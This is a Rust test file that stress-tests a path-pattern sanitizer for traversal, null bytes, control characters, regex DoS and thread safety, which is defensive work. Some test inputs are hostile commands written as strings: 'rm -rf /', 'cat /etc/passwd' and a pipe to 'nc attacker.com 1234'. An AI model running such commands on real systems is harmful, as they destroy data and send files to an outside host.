//! Stress tests for security fixes to find potential bugs and edge cases

use context_creator::core::walker::{sanitize_pattern, WalkOptions};
use std::fs;
use tempfile::TempDir;

#[test]
fn test_sanitization_stress_boundary_conditions() {
    // Test edge cases that might reveal bugs in boundary checking

    // Test exactly at boundary
    let exactly_1000 = "a".repeat(1000);
    assert!(sanitize_pattern(&exactly_1000).is_ok());

    // Test just over boundary
    let just_over = "a".repeat(1001);
    assert!(sanitize_pattern(&just_over).is_err());

    // Test way over boundary
    let way_over = "a".repeat(10000);
    assert!(sanitize_pattern(&way_over).is_err());
}

#[test]
fn test_sanitization_stress_unicode_edge_cases() {
    // Test Unicode characters that might bypass security checks

    // Unicode dots that could be used for traversal
    let unicode_dots = "file\u{002e}\u{002e}/secret";
    assert!(
        sanitize_pattern(unicode_dots).is_err(),
        "Unicode dots should be rejected"
    );

    // Unicode null
    let unicode_null = "file\u{0000}.txt";
    assert!(
        sanitize_pattern(unicode_null).is_err(),
        "Unicode null should be rejected"
    );

    // Unicode separators
    let unicode_sep = "file\u{2028}name.txt"; // Line separator
    assert!(
        sanitize_pattern(unicode_sep).is_err(),
        "Unicode line separator should be rejected"
    );

    // Valid Unicode
    let valid_unicode = "файл*.txt";
    assert!(
        sanitize_pattern(valid_unicode).is_ok(),
        "Valid Unicode should be allowed"
    );
}

#[test]
fn test_sanitization_stress_mixed_attacks() {
    // Test patterns that combine multiple attack vectors

    let mixed_attacks = vec![
        "../\0secret.txt",    // Traversal + null
        "/etc/passwd\x01",    // Absolute + control
        "..\\..\\file\0.txt", // Windows traversal + null
        "\x7f../secret",      // Control + traversal
        "/\0\x01\x02\x03",    // Multiple violations
    ];

    for pattern in mixed_attacks {
        assert!(
            sanitize_pattern(pattern).is_err(),
            "Mixed attack pattern should be rejected: {pattern:?}"
        );
    }
}

#[test]
fn test_parallel_error_handling_stress() {
    // Test error handling under stress conditions
    use context_creator::core::walker::walk_directory;

    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create some files
    fs::write(root.join("file1.txt"), "content1").unwrap();
    fs::write(root.join("file2.txt"), "content2").unwrap();

    // Test with malicious patterns
    let malicious_options = WalkOptions {
        max_file_size: Some(1024),
        follow_links: false,
        include_hidden: false,
        parallel: true,
        ignore_file: ".digestignore".to_string(),
        ignore_patterns: vec![],
        include_patterns: vec!["../../../etc/passwd".to_string()],
        custom_priorities: vec![],
        filter_binary_files: false,
    };

    // This should fail due to sanitization
    let result = walk_directory(root, malicious_options);
    assert!(result.is_err(), "Malicious patterns should be rejected");

    let error_msg = format!("{result:?}");
    assert!(error_msg.contains("Directory traversal") || error_msg.contains("Invalid"));
}

#[test]
fn test_sanitization_performance_dos_prevention() {
    // Test that sanitization doesn't have performance vulnerabilities
    use std::time::Instant;

    // Test with patterns designed to cause regex DoS
    let potentially_slow_patterns = vec![
        "a".repeat(1000),     // Long string
        "a*".repeat(100),     // Many wildcards
        "{a,b}".repeat(50),   // Many alternatives
        "[a-z]*".repeat(100), // Many character classes
    ];

    for pattern in potentially_slow_patterns {
        let start = Instant::now();
        let _result = sanitize_pattern(&pattern);
        let duration = start.elapsed();

        // Sanitization should be very fast (under 1ms for these patterns)
        assert!(
            duration.as_millis() < 10,
            "Sanitization took too long: {:?} for pattern length {}",
            duration,
            pattern.len()
        );
    }
}

#[test]
fn test_error_classification_edge_cases() {
    // Test edge cases in error classification that might cause misclassification

    use context_creator::utils::error::ContextCreatorError;

    // Test errors that contain keywords but shouldn't be critical
    let non_critical_errors = vec![
        "File contains the word Permission denied but isn't actually permission denied",
        "Invalid file format, not Invalid configuration",
        "This message mentions Permission denied in passing",
    ];

    for error_text in non_critical_errors {
        let error = ContextCreatorError::FileProcessingError {
            path: "test.txt".to_string(),
            error: error_text.to_string(),
        };

        let error_string = error.to_string();

        // These should still be classified as critical due to keywords
        // This test documents current behavior - keywords anywhere trigger critical classification
        assert!(error_string.contains("Permission denied") || error_string.contains("Invalid"));
    }
}

#[test]
fn test_sanitization_injection_resistance() {
    // Test resistance to various injection attacks

    let large_buffer = "A".repeat(100000);
    let injection_attempts = vec![
        // Command injection attempts
        "file.txt; rm -rf /",
        "file.txt && cat /etc/passwd",
        "file.txt | nc attacker.com 1234",
        // Path injection attempts
        "file.txt\n../../../etc/passwd",
        "file.txt\r\n/etc/shadow",
        // Format string attempts
        "%s%s%s%s",
        "%n%n%n%n",
        // Buffer overflow attempts
        &large_buffer,
    ];

    for pattern in injection_attempts {
        // Sanitization should handle these gracefully
        let result = sanitize_pattern(pattern);

        // Most should be rejected, but shouldn't crash
        if result.is_ok() {
            // If accepted, should be exactly the same string (no interpretation)
            assert_eq!(result.unwrap(), pattern);
        }
        // If rejected, that's also fine and expected for many of these
    }
}

#[test]
fn test_concurrent_sanitization_safety() {
    // Test that sanitization is thread-safe and doesn't have race conditions
    use std::sync::Arc;
    use std::thread;

    let patterns: Arc<Vec<String>> = Arc::new(vec![
        "*.py".to_string(),
        "../../../etc/passwd".to_string(),
        "file\0.txt".to_string(),
        "/etc/shadow".to_string(),
        "valid_pattern.rs".to_string(),
        "a".repeat(2000),
    ]);

    let mut handles = vec![];

    // Spawn multiple threads to test concurrently
    for _ in 0..10 {
        let patterns_clone: Arc<Vec<String>> = Arc::clone(&patterns);
        let handle = thread::spawn(move || {
            for pattern in patterns_clone.iter() {
                let result = sanitize_pattern(pattern);

                // Results should be consistent across threads
                match pattern.as_str() {
                    "*.py" | "valid_pattern.rs" => {
                        assert!(result.is_ok(), "Valid pattern should always be accepted");
                    }
                    p if p.contains("..")
                        || p.contains('\0')
                        || p.starts_with('/')
                        || p.len() > 1000 =>
                    {
                        assert!(result.is_err(), "Invalid pattern should always be rejected");
                    }
                    _ => {} // Other patterns can vary
                }
            }
        });
        handles.push(handle);
    }

    // Wait for all threads to complete
    for handle in handles {
        handle.join().expect("Thread should complete successfully");
    }
}

#[test]
fn test_memory_safety_large_inputs() {
    // Test memory safety with large inputs that could cause issues

    // Very large pattern
    let huge_pattern = "x".repeat(100_000);
    let result = sanitize_pattern(&huge_pattern);
    assert!(result.is_err(), "Huge pattern should be rejected");

    // Pattern with many null bytes
    let many_nulls = "\0".repeat(1000);
    let result = sanitize_pattern(&many_nulls);
    assert!(
        result.is_err(),
        "Pattern with many nulls should be rejected"
    );

    // These operations should not cause memory corruption or crashes
}
